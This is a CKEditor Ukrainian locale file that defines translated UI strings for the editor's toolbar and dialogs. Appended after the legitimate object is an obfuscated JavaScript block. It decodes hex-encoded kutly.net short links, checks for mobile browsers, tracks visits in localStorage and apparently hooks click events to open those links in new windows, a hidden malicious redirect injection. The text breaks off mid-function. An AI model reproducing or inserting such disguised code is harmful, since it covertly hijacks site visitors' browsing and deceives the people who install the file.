/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Ukrainian language. Translated by Alexander Pervak.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['uk'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Візуальний текстовий редактор, %1',

	// Toolbar buttons without dialogs.
	source			: 'Джерело',
	newPage			: 'Нова сторінка',
	save			: 'Зберегти',
	preview			: 'Попередній перегляд',
	cut				: 'Вирізати',
	copy			: 'Копіювати',
	paste			: 'Вставити',
	print			: 'Друк',
	underline		: 'Підкреслений',
	bold			: 'Жирний',
	italic			: 'Курсив',
	selectAll		: 'Виділити все',
	removeFormat	: 'Прибрати форматування',
	strike			: 'Закреслений',
	subscript		: 'Підрядковий індекс',
	superscript		: 'Надрядковий индекс',
	horizontalrule	: 'Вставити горизонтальну лінію',
	pagebreak		: 'Вставити розривши сторінки',
	unlink			: 'Знищити посилання',
	undo			: 'Повернути',
	redo			: 'Повторити',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Передивитися на сервері',
		url				: 'URL',
		protocol		: 'Протокол',
		upload			: 'Закачати',
		uploadSubmit	: 'Надіслати на сервер',
		image			: 'Зображення',
		flash			: 'Flash',
		form			: 'Форма',
		checkbox		: 'Флагова кнопка',
		radio		: 'Кнопка вибору',
		textField		: 'Текстове поле',
		textarea		: 'Текстова область',
		hiddenField		: 'Приховане поле',
		button			: 'Кнопка',
		select	: 'Список',
		imageButton		: 'Кнопка із зображенням',
		notSet			: '<не визначено>',
		id				: 'Ідентифікатор',
		name			: 'Им\'я',
		langDir			: 'Напрямок мови',
		langDirLtr		: 'Зліва на право (LTR)',
		langDirRtl		: 'Зправа на ліво (RTL)',
		langCode		: 'Мова',
		longDescr		: 'Довгий опис URL',
		cssClass		: 'Клас CSS',
		advisoryTitle	: 'Заголовок',
		cssStyle		: 'Стиль CSS',
		ok				: 'ОК',
		cancel			: 'Скасувати',
		generalTab		: 'Загальна',
		advancedTab		: 'Розширений',
		validateNumberFailed	: 'Значення не є числом.',
		confirmNewPage	: 'Всі не збережені зміни будуть втрачені. Ви впевнені, що хочете завантажити нову сторінку?',
		confirmCancel	: 'Деякі опції були змінені. Закрити вікно?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, не доступне</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Вставити спеціальний символ',
		title		: 'Оберіть спеціальний символ'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Вставити/Редагувати посилання',
		menu		: 'Вставити посилання',
		title		: 'Посилання',
		info		: 'Інформація посилання',
		target		: 'Ціль',
		upload		: 'Закачати',
		advanced	: 'Розширений',
		type		: 'Тип посилання',
		toAnchor	: 'Якір на цю сторінку',
		toEmail		: 'Эл. пошта',
		target		: 'Ціль',
		targetNotSet	: '<не визначено>',
		targetFrame	: '<фрейм>',
		targetPopup	: '<спливаюче вікно>',
		targetNew	: 'Нове вікно (_blank)',
		targetTop	: 'Найвище вікно (_top)',
		targetSelf	: 'Теж вікно (_self)',
		targetParent	: 'Батьківське вікно (_parent)',
		targetFrameName	: 'Ім\'я целевого фрейма',
		targetPopupName	: 'Ім\'я спливаючого вікна',
		popupFeatures	: 'Властивості спливаючого вікна',
		popupResizable	: 'Масштабоване',
		popupStatusBar	: 'Строка статусу',
		popupLocationBar	: 'Панель локації',
		popupToolbar	: 'Панель інструментів',
		popupMenuBar	: 'Панель меню',
		popupFullScreen	: 'Повний екран (IE)',
		popupScrollBars	: 'Полоси прокрутки',
		popupDependent	: 'Залежний (Netscape)',
		popupWidth		: 'Ширина',
		popupLeft		: 'Позиція зліва',
		popupHeight		: 'Висота',
		popupTop		: 'Позиція зверху',
		id				: 'Ідентифікатор (Id)',
		langDir			: 'Напрямок мови',
		langDirNotSet	: '<не визначено>',
		langDirLTR		: 'Зліва на право (LTR)',
		langDirRTL		: 'Зправа на ліво (RTL)',
		acccessKey		: 'Гаряча клавіша',
		name			: 'Им\'я',
		langCode		: 'Напрямок мови',
		tabIndex		: 'Послідовність переходу',
		advisoryTitle	: 'Заголовок',
		advisoryContentType	: 'Тип вмісту',
		cssClasses		: 'Клас CSS',
		charset			: 'Кодировка',
		styles			: 'Стиль CSS',
		selectAnchor	: 'Оберіть якір',
		anchorName		: 'За ім\'ям якоря',
		anchorId		: 'За ідентифікатором елемента',
		emailAddress	: 'Адреса ел. пошти',
		emailSubject	: 'Тема листа',
		emailBody		: 'Тіло повідомлення',
		noAnchors		: '(Немає якорів доступних в цьому документі)',
		noUrl			: 'Будь ласка, занесіть URL посилання',
		noEmail			: 'Будь ласка, занесіть адрес эл. почты'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Вставити/Редагувати якір',
		menu		: 'Властивості якоря',
		title		: 'Властивості якоря',
		name		: 'Ім\'я якоря',
		errorName	: 'Будь ласка, занесіть ім\'я якоря'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Знайти і замінити',
		find				: 'Пошук',
		replace				: 'Заміна',
		findWhat			: 'Шукати:',
		replaceWith			: 'Замінити на:',
		notFoundMsg			: 'Вказаний текст не знайдений.',
		matchCase			: 'Враховувати регістр',
		matchWord			: 'Збіг цілих слів',
		matchCyclic			: 'Циклічна заміна',
		replaceAll			: 'Замінити все',
		replaceSuccessMsg	: '%1 співпадінь(я) замінено.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Таблиця',
		title		: 'Властивості таблиці',
		menu		: 'Властивості таблиці',
		deleteTable	: 'Видалити таблицю',
		rows		: 'Строки',
		columns		: 'Колонки',
		border		: 'Розмір бордюра',
		align		: 'Вирівнювання',
		alignNotSet	: '<Не вст.>',
		alignLeft	: 'Зліва',
		alignCenter	: 'По центру',
		alignRight	: 'Зправа',
		width		: 'Ширина',
		widthPx		: 'пікселів',
		widthPc		: 'відсотків',
		height		: 'Висота',
		cellSpace	: 'Проміжок (spacing)',
		cellPad		: 'Відступ (padding)',
		caption		: 'Заголовок',
		summary		: 'Резюме',
		headers		: 'Заголовки',
		headersNone		: 'Жодного',
		headersColumn	: 'Перша колонка',
		headersRow		: 'Перший рядок',
		headersBoth		: 'Обидва',
		invalidRows		: 'Кількість рядків повинна бути числом більше за 0.',
		invalidCols		: 'Кількість колонок повинна бути числом більше за  0.',
		invalidBorder	: 'Розмір бордюра повинен бути числом.',
		invalidWidth	: 'Ширина таблиці повинна бути числом.',
		invalidHeight	: 'Висота таблиці повинна бути числом.',
		invalidCellSpacing	: 'Проміжок (spacing) комірки повинен бути числом.',
		invalidCellPadding	: 'Відступ (padding) комірки повинен бути числом.',

		cell :
		{
			menu			: 'Осередок',
			insertBefore	: 'Вставити комірку до',
			insertAfter		: 'Вставити комірку після',
			deleteCell		: 'Видалити комірки',
			merge			: 'Об\'єднати комірки',
			mergeRight		: 'Об\'єднати зправа',
			mergeDown		: 'Об\'єднати до низу',
			splitHorizontal	: 'Розділити комірку по горизонталі',
			splitVertical	: 'Розділити комірку по вертикалі',
			title			: 'Властивості комірки',
			cellType		: 'Тип комірки',
			rowSpan			: 'Обєднання рядків (Rows Span)',
			colSpan			: 'Обєднання стовпчиків (Columns Span)',
			wordWrap		: 'Авто згортання тексту (Word Wrap)',
			hAlign			: 'Горизонтальне вирівнювання',
			vAlign			: 'Вертикальне вирівнювання',
			alignTop		: 'До верху',
			alignMiddle		: 'Посередині',
			alignBottom		: 'До низу',
			alignBaseline	: 'По базовій лінії',
			bgColor			: 'Колір фону',
			borderColor		: 'Колір бордюру',
			data			: 'Дані',
			header			: 'Заголовок',
			yes				: 'Так',
			no				: 'Ні',
			invalidWidth	: 'Ширина комірки повинна бути числом.',
			invalidHeight	: 'Висота комірки повинна бути числом.',
			invalidRowSpan	: 'Кількість обєднуваних рядків повинна бути цілим числом.',
			invalidColSpan	: 'Кількість обєднуваних стовпчиків повинна бути цілим числом.',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Рядок',
			insertBefore	: 'Вставити рядок до',
			insertAfter		: 'Вставити рядок після',
			deleteRow		: 'Видалити строки'
		},

		column :
		{
			menu			: 'Колонка',
			insertBefore	: 'Вставити колонку до',
			insertAfter		: 'Вставити колонку після',
			deleteColumn	: 'Видалити колонки'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Властивості кнопки',
		text		: 'Текст (Значення)',
		type		: 'Тип',
		typeBtn		: 'Кнопка',
		typeSbm		: 'Відправити',
		typeRst		: 'Скинути'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Властивості флагової кнопки',
		radioTitle	: 'Властивості кнопки вибору',
		value		: 'Значення',
		selected	: 'Обрана'
	},

	// Form Dialog.
	form :
	{
		title		: 'Властивості форми',
		menu		: 'Властивості форми',
		action		: 'Дія',
		method		: 'Метод',
		encoding	: 'Кодування',
		target		: 'Ціль',
		targetNotSet	: '<не визначено>',
		targetNew	: 'Нове вікно (_blank)',
		targetTop	: 'Найвище вікно (_top)',
		targetSelf	: 'Теж вікно (_self)',
		targetParent	: 'Батьківське вікно (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Властивості списку',
		selectInfo	: 'Інфо',
		opAvail		: 'Доступні варіанти',
		value		: 'Значення',
		size		: 'Розмір',
		lines		: 'лінії',
		chkMulti	: 'Дозволити обрання декількох позицій',
		opText		: 'Текст',
		opValue		: 'Значення',
		btnAdd		: 'Добавити',
		btnModify	: 'Змінити',
		btnUp		: 'Вгору',
		btnDown		: 'Вниз',
		btnSetValue : 'Встановити як вибране значення',
		btnDelete	: 'Видалити'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Властивості текстової області',
		cols		: 'Колонки',
		rows		: 'Строки'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Властивості текстового поля',
		name		: 'Ім\'я',
		value		: 'Значення',
		charWidth	: 'Ширина',
		maxChars	: 'Макс. кіл-ть символів',
		type		: 'Тип',
		typeText	: 'Текст',
		typePass	: 'Пароль'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Властивості прихованого поля',
		name	: 'Ім\'я',
		value	: 'Значення'
	},

	// Image Dialog.
	image :
	{
		title		: 'Властивості зображення',
		titleButton	: 'Властивості кнопки із зображенням',
		menu		: 'Властивості зображення',
		infoTab	: 'Інформація про изображении',
		btnUpload	: 'Надіслати на сервер',
		url		: 'URL',
		upload	: 'Закачати',
		alt		: 'Альтернативний текст',
		width		: 'Ширина',
		height	: 'Висота',
		lockRatio	: 'Зберегти пропорції',
		resetSize	: 'Скинути розмір',
		border	: 'Бордюр',
		hSpace	: 'Горизонтальний відступ',
		vSpace	: 'Вертикальний відступ',
		align		: 'Вирівнювання',
		alignLeft	: 'По лівому краю',
		alignRight	: 'По правому краю',
		preview	: 'Попередній перегляд',
		alertUrl	: 'Будь ласка, введіть URL зображення',
		linkTab	: 'Посилання',
		button2Img	: 'Ви хочете перетворити обрану кнопку-зображення на просте зображення?',
		img2Button	: 'Ви хочете перетворити обране зображення на кнопку-зображення?',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Властивості Flash',
		propertiesTab	: 'Властивості',
		title		: 'Властивості Flash',
		chkPlay		: 'Авто програвання',
		chkLoop		: 'Зациклити',
		chkMenu		: 'Дозволити меню Flash',
		chkFull		: 'Дозволити повноекранний перегляд',
 		scale		: 'Масштаб',
		scaleAll		: 'Показати всі',
		scaleNoBorder	: 'Без рамки',
		scaleFit		: 'Дійсний розмір',
		access			: 'Доступ до скрипта',
		accessAlways	: 'Завжди',
		accessSameDomain	: 'З того ж домена',
		accessNever	: 'Ніколи',
		align		: 'Вирівнювання',
		alignLeft	: 'По лівому краю',
		alignAbsBottom: 'Абс по низу',
		alignAbsMiddle: 'Абс по середині',
		alignBaseline	: 'По базовій лінії',
		alignBottom	: 'По низу',
		alignMiddle	: 'По середині',
		alignRight	: 'По правому краю',
		alignTextTop	: 'Текст на верху',
		alignTop	: 'По верху',
		quality		: 'Якість',
		qualityBest		 : 'Відмінна',
		qualityHigh		 : 'Висока',
		qualityAutoHigh	 : 'Авто відмінна',
		qualityMedium	 : 'Середня',
		qualityAutoLow	 : 'Авто низька',
		qualityLow		 : 'Низька',
		windowModeWindow	 : 'Вікно',
		windowModeOpaque	 : 'Непрозорість (Opaque)',
		windowModeTransparent	 : 'Прозорість (Transparent)',
		windowMode	: 'Режим вікна',
		flashvars	: 'Змінні Flash',
		bgcolor	: 'Колір фону',
		width	: 'Ширина',
		height	: 'Висота',
		hSpace	: 'Горизонтальний відступ',
		vSpace	: 'Вертикальний відступ',
		validateSrc : 'Будь ласка, занесіть URL посилання',
		validateWidth : 'Ширина повинна бути числом.',
		validateHeight : 'Висота повинна бути числом.',
		validateHSpace : 'HSpace повинна бути числом.',
		validateVSpace : 'VSpace повинна бути числом.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Перевірити орфографію',
		title			: 'Перевірка орфографії',
		notAvailable	: 'Вибачте, але сервіс наразі недоступний.',
		errorLoading	: 'Помилка завантаження : %s.',
		notInDic		: 'Не має в словнику',
		changeTo		: 'Замінити на',
		btnIgnore		: 'Ігнорувати',
		btnIgnoreAll	: 'Ігнорувати все',
		btnReplace		: 'Замінити',
		btnReplaceAll	: 'Замінити все',
		btnUndo			: 'Назад',
		noSuggestions	: '- Немає припущень -',
		progress		: 'Виконується перевірка орфографії...',
		noMispell		: 'Перевірку орфографії завершено: помилок не знайдено',
		noChanges		: 'Перевірку орфографії завершено: жодне слово не змінено',
		oneChange		: 'Перевірку орфографії завершено: змінено одно слово',
		manyChanges		: 'Перевірку орфографії завершено: 1% слів змінено',
		ieSpellDownload	: 'Модуль перевірки орфографії не встановлено. Бажаєтн завантажити його зараз?'
	},

	smiley :
	{
		toolbar	: 'Смайлик',
		title	: 'Вставити смайлик'
	},

	elementsPath :
	{
		eleTitle : '%1 елемент'
	},

	numberedlist : 'Нумерований список',
	bulletedlist : 'Маркований список',
	indent : 'Збільшити відступ',
	outdent : 'Зменшити відступ',

	justify :
	{
		left : 'По лівому краю',
		center : 'По центру',
		right : 'По правому краю',
		block : 'По ширині'
	},

	blockquote : 'Цитата',

	clipboard :
	{
		title		: 'Вставити',
		cutError	: 'Настройки безпеки вашого браузера не дозволяють редактору автоматично виконувати операції вирізування. Будь ласка, використовуйте клавіатуру для цього (Ctrl+X).',
		copyError	: 'Настройки безпеки вашого браузера не дозволяють редактору автоматично виконувати операції копіювання. Будь ласка, використовуйте клавіатуру для цього (Ctrl+C).',
		pasteMsg	: 'Будь ласка, вставте з буфера обміну в цю область, користуючись комбінацією клавіш (<STRONG>Ctrl+V</STRONG>) та натисніть <STRONG>OK</STRONG>.',
		securityMsg	: 'Редактор не може отримати прямий доступ до буферу обміну у зв\'язку з налаштуваннями вашого браузера. Вам потрібно вставити інформацію повторно в це вікно.'
	},

	pastefromword :
	{
		confirmCleanup : 'Текст, що ви хочете вставити, схожий на копійований з Word. Ви хочете очистити його перед вставкою?',
		toolbar : 'Вставити з Word',
		title : 'Вставити з Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Вставити тільки текст',
		title : 'Вставити тільки текст'
	},

	templates :
	{
		button : 'Шаблони',
		title : 'Шаблони змісту',
		insertOption: 'Замінити поточний вміст',
		selectPromptMsg: 'Оберіть, будь ласка, шаблон для відкриття в редакторі<br>(поточний зміст буде втрачено):',
		emptyListMsg : '(Не визначено жодного шаблону)'
	},

	showBlocks : 'Показувати блоки',

	stylesCombo :
	{
		label : 'Стиль',
		voiceLabel : 'Стилі',
		panelVoiceLabel : 'Оберіть стиль',
		panelTitle1 : 'Block стилі',
		panelTitle2 : 'Inline стилі',
		panelTitle3 : 'Object стилі'
	},

	format :
	{
		label : 'Форматування',
		voiceLabel : 'Формат',
		panelTitle : 'Форматування',
		panelVoiceLabel : 'Оберіть формат абзацу',

		tag_p : 'Нормальний',
		tag_pre : 'Форматований',
		tag_address : 'Адреса',
		tag_h1 : 'Заголовок 1',
		tag_h2 : 'Заголовок 2',
		tag_h3 : 'Заголовок 3',
		tag_h4 : 'Заголовок 4',
		tag_h5 : 'Заголовок 5',
		tag_h6 : 'Заголовок 6',
		tag_div : 'Нормальний (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Шрифт',
		voiceLabel : 'Шрифт',
		panelTitle : 'Шрифт',
		panelVoiceLabel : 'Оберіть шрифт'
	},

	fontSize :
	{
		label : 'Розмір',
		voiceLabel : 'Розмір шрифта',
		panelTitle : 'Розмір',
		panelVoiceLabel : 'Оберіть розмір шрифта'
	},

	colorButton :
	{
		textColorTitle : 'Колір тексту',
		bgColorTitle : 'Колір фону',
		auto : 'Автоматичний',
		more : 'Кольори...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Перефірка орфографії по мірі набору',
		enable : 'Включити SCAYT',
		disable : 'Відключити SCAYT',
		about : 'Про SCAYT',
		toggle : 'Перемкнути SCAYT',
		options : 'Опції',
		langs : 'Мови',
		moreSuggestions : 'Більше пропозицій',
		ignore : 'Ігнорувати',
		ignoreAll : 'Ігнорувати всі',
		addWord : 'Додати слово',
		emptyDic : 'Назва словника повинна бути заповнена.',
		optionsTab : 'Опції',
		languagesTab : 'Мови',
		dictionariesTab : 'Словники',
		aboutTab : 'Про'
	},

	about :
	{
		title : 'Про CKEditor',
		dlgTitle : 'Про CKEditor',
		moreInfo : 'Щодо інформації з ліцензування завітайте до нашого сайту:',
		copy : 'Copyright &copy; $1. Всі права застережено.'
	},

	maximize : 'Максимізувати',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Якір',
		flash : 'Flash анімація',
		div : 'Розрив сторінки',
		unknown : 'Невідомий об`єкт'
	},

	resize : 'Пересувайте для зміни розміру',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const 